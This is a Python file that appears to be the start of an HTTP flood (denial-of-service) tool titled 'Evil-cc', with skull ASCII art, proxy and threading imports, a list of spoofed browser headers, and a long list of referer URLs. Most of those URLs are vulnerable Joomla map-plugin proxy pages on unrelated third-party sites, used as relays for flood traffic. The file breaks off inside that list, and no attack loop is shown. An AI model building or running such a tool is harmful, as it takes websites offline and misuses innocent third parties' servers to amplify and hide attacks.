#!/usr/bin/python3

#!/usr/bin/python3
import requests
import socket
import os
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import colorama
from colorama import Fore

os.system('cls')
os.system('title Bots : 2056 ^ (Evil-cc)  ^')

print(Fore.RED+'''
                              '....xxxxx...,'. '   
                           ..XXXXXXXXXXXXXXXXXXXXx.    
                        ..XXXXXXXXWWWWWWWWWWWWWWWWXXXX.  
                   ...XXXXXWWW"   W88N88@888888WWWWWXX.   
                 ...XXXXXXWWW"    M88N88GGGGGG888^8M "WMBX.    
               ..XXXXXXXXWWW"     M88888WWRWWWMW8oo88M   WWMX.    
           "XXXXXXXXXXXXWW"       WN8888WWWWW  W8@@@8M    BMBRX.        
          XXXXXXXX=MMWW":  .      W8N888WWWWWWWW88888W      XRBRXX.  
           ""XXXXXMM::::. .        W8@889WWWWWM8@8N8W      . . :RRXx.    
                   MMM::.:.  .      W888N89999888@8W      . . ::::"RXV    
                      MMMm::.  .      WW888N88888WW     .  . mmMMMMMRXx
                       ""MMmm .  .       WWWWWWW   . :. :,miMM"""  
                              ""MMMMmm . .  .  .   ._,mMMMM""" 
                                  ""MMMMMMMMMMMMM""" 
                                                    Evil BB''')
print('\r')
#XML acceptation
acceptall = [
 "Accept: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36",
        "Accept: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36",
        "Accept: Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
        "Accept: Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
        "Accept: Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
        "Accept: Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
        "Accept: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Accept: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0",
        "Accept: Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3",
        "Accept: Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0",
        "Accept: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10 (Edition beta)",
        "Accept: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
        "Accept: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
        "Accept: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
        "Accept: Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
        "Accept: Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Accept: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Accept:Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
        "Accept: Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
        "Accept: Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
        "Accept: Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
        "Accept: Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
        "Accept: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
        "Accept: Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
        "Accept: Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
#referencement
referers = [

"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
"http://host-tracker.com/check_page/?furl=",
"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
"http://http://www.viewdns.info/ismysitedown/?domain=",
"http://www.onlinewebcheck.com/check.php?url=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"https://validator.w3.org/check?uri=",
"https://drive.google.com/viewerng/viewer?url=",
"http://www.google.com/translate?u=",
"https://developers.google.com/speed/pagespeed/insights/?url=",
"http://help.baidu.com/searchResult?keywords=",
"http://www.bing.com/search?q=",
"https://add.my.yahoo.com/rss?url=",
"https://play.google.com/store/search?q=",
"http://www.google.com/?q=",
"http://regex.info/exif.cgi?url=",
"http://anonymouse.org/cgi-bin/anon-www.cgi/",
"http://www.google.com/translate?u=",
"http://translate.google.com/translate?u=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
"http://validator.w3.org/check?uri=",
"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://validator.w3.org/checklink?uri=",
"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
"http://validator.w3.org/mobile/check?docAddr=",
"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
"http://feedvalidator.org/check.cgi?url=",
"http://gmodules.com/ig/creator?url=",
"http://www.google.com/ig/adde?moduleurl=",
"http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
"http://browsershots.org;POST;browsershots.org.txt",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
"http://web-sniffer.net/?url=",
"http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
"http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
"http://translate.yandex.net/tr-url/ru-uk.uk/",
"http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
"http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
"http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
"http://validator.w3.org/nu/?doc=",
"http://www.netvibes.com/subscribe.php?url=",
"http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.google.com/ig/add?feedurl=",
"http://www.google.com/translate?u=",
"http://translate.google.com/translate?u=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
"http://validator.w3.org/check?uri=",
"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://validator.w3.org/checklink?uri=",
"http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
"http://www.w3.org/services/tidy?docAddr=",
"http://validator.w3.org/mobile/check?docAddr=",
"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
"http://validator.w3.org/p3p/20020128/policy.pl?uri=",
"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
"http://feedvalidator.org/check.cgi?url=",
"http://gmodules.com/ig/creator?url=",
"http://www.google.com/ig/adde?moduleurl=",
"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
"http://host-tracker.com/check_page/?furl=",
"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
"http://www.viewdns.info/ismysitedown/?domain=",
"http://www.onlinewebcheck.com/check.php?url=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"https://www.google.com/search?q=",
"https://check-host.net/",
"https://www.facebook.com/",
"https://www.youtube.com/",
"https://www.bing.com/search?q=",
"https://r.search.yahoo.com/",
"https://www.cia.gov/index.html",
"http://netsec-reborn.onion/QuickStresser-virus?id=",
"https://vk.com/profile.php?redirect=",
"https://www.usatoday.com/search/results?q=",
"https://help.baidu.com/searchResult?keywords=",
"https://steamcommunity.com/market/search?q=",
"https://www.ted.com/search?q=",
"https://play.google.com/store/search?q=",
"https://drive.google.com/viewerng/viewer?url=",
"http://www.google.com/translate?u=",
"https://developers.google.com/speed/pagespeed/insights/?url=",
"http://help.baidu.com/searchResult?keywords=",
"http://www.bing.com/search?q=",
"https://add.my.yahoo.com/rss?url=",
"https://play.google.com/store/search?q=",
"http://www.google.com/?q=",
"http://regex.info/exif.cgi?url=",
"http://www.google.com/translate?u=",
"http://translate.google.com/translate?u=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://validator.w3.org/check?uri=",
"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://validator.w3.org/checklink?uri=",
"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
"http://validator.w3.org/mobile/check?docAddr=",
"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
"http://feedvalidator.org/check.cgi?url=",
"http://gmodules.com/ig/creator?url=",
"http://www.google.com/ig/adde?moduleurl=",
"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
"http://host-tracker.com/check_page/?furl=",
"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
"http://www.onlinewebcheck.com/check.php?url=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://web-sniffer.net/?url=",
